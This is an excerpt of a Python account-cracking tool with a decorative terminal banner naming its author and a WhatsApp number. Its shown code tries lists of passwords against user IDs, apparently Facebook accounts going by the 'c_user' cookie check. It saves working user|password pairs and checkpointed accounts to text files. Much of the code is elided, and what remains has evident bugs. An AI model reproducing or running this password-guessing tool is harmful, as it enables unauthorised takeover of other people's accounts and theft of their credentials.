...
logo =                                          """   
   \033[1;37m✿.｡.:* ☆:**:. ѕ𝔥𝕒𝒽ιＤ .:**:.☆*.:｡.✿
   \033[1;37m😡✎  DARK  💋🐲
   \033[1;37m¸,ø¤º°`°º¤ø,¸ FU3K ¸,ø¤º°`°º¤ø,¸
   ...
   \033[1;37m(_-)  🥰😘 (-_-)   
\x1b[1;97m------------------------\x1b[1;97m------------------------
\033[1;31m\033[1;37m Author \x1b[1;97m : \033[1;37m           SHAHID
\033[1;31m\033[1;37m Whatsapp\x1b[1;97m:  \033[1;37m          03081008587
\033[1;31m\033[1;37m GitHub\x1b[1;97m  : \033[1;37m           UNKOWN
\033[1;31m\033[1;37m Version\x1b[1;97m : \033[1;37m             7.1.0
\033[1;37m------------------------\033[1;37m------------------------ """                                              
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mdark_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mdark_CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;97mPress enter to back dark Menu ")
	    sarfraz()
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;97m[dark] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [dark-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('dark_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s [dark-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('dark_CP.txt' , 'a').write('%s\n' % wrt)
                        break
